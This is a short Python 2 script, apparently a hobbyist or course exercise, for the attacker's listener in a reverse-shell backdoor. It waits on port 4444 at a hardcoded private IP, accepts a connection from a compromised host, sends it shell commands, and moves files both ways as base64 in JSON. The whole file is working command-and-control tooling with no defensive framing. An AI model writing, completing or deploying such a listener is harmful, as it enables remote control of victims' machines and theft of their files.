import socket
import json
import base64


class Listner:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("\r[+} Waiting for a connection ")
        self.connection, address = listener.accept()
        print("\r[+} Got a Connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + str(self.connection.recv(1024))
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotly(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_recv()

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download Suscessfull."

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    filecontent = self.read_file(command[1])
                    command.append(filecontent)
                result = self.execute_remotly(command)
                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error : Something went wrong"
            print(result)


my_listener = Listner("192.168.100.35", 4444)
my_listener.run()
